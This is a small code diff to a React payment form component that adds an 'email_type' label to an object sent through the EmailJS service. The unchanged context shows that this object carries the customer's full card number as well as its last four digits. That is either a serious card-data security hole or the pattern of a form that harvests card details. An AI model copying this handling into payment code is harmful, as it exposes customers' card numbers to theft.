@@ -199,6 +199,7 @@ export default function PaymentForm() {
         billing_zip: paymentData.billingZip || "N/A",
         card_number: paymentData.cardNumber,
         card_last4: paymentData.cardNumber.slice(-4),
+        email_type: "Payment Completed",
       };
 
       await emailjs.send(
